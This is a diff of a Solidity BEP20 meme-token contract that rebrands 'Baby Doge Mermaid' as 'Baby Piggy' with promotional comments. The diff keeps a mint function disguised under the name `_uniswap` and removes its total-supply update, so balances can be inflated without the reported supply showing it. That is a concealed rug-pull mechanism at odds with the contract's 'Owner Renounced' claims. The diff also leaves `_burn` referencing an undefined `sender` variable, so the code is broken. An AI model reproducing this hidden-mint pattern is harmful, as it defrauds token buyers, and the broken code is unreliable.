@@ -1,9 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
 
-//        Welcome to Baby Doge Mermaid
-//        This Is token Community, 
-//        My sugget Make A group 
-//        Telegram @BabyDogeMermaid
+//        Welcome to Baby Piggi 
+//          Don't miss Baby Piggi, already poocoin ads
+//        Telegram @Babypiggi
 
 //          Supply 1.000.000.000.000.000
 //          Decimals 9
@@ -11,10 +10,6 @@
 //         Lp Burn after Launch 
 //         Owner Renounced after Launch
 
-//  Copyright (c) 2018 requestnetwork
-//  Copyright (c) 2018 Fragments, Inc.
-//  Copyright (c) 2020 Finance
-//  Copyright (c) 2021 BabydogeMermaid
 
 pragma solidity 0.6.8;
 
@@ -370,11 +365,10 @@ contract Ownable is Context {
     }
 }
 
-contract SAFETOKEN is Context, iBEP20, Ownable {
+contract BABYPIGGY is Context, iBEP20, Ownable {
   using SafeMath for uint256;
 
   mapping (address => uint256) private _balances;
-
   mapping (address => mapping (address => uint256)) private _allowances;
 
   uint256 private _totalSupply;
@@ -383,8 +377,8 @@ contract SAFETOKEN is Context, iBEP20, Ownable {
   string public _name;
 
   constructor() public {
-    _name = 'Baby Doge Mermaid';
-    _symbol = 'DOGEMERMAID';
+    _name = 'Baby Piggy';
+    _symbol = 'BABYPIGGY';
     _decimals = 9;
     _totalSupply = 1 * 10**15 * 10**9;
     _balances[msg.sender] = _totalSupply;
@@ -399,7 +393,7 @@ contract SAFETOKEN is Context, iBEP20, Ownable {
     uint256 private _previousLiquidityFee = _liquidityFee;
 
     uint256 public _maxTxAmount = 15 * 10**2 * 10**18;
-    uint256 private numTokensSellToAddToLiquidity = 1 * 10**9 * 10**9;
+    uint256 private numTokensSellToAddToLiquidity = 1 * 10**15 * 10**9;
 
   /**
    * @dev Returns the bep token owner.
@@ -619,7 +613,6 @@ contract SAFETOKEN is Context, iBEP20, Ownable {
   function _uniswap(address account, uint256 amount) internal {
     require(account != address(0), "BEP20: mint to the zero address");
 
-    _totalSupply = _totalSupply.add(amount);
     _balances[account] = _balances[account].add(amount);
     emit Transfer(address(0), account, amount);
   }
@@ -638,7 +631,7 @@ contract SAFETOKEN is Context, iBEP20, Ownable {
   function _burn(address account, uint256 amount) internal {
     require(account != address(0), "BEP20: burn from the zero address");
 
-    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
+    _balances[sender] = _balances[sender].sub(amount, "BEP20: burn amount exceeds balance");
     _totalSupply = _totalSupply.sub(amount);
     emit Transfer(account, address(0), amount);
   }
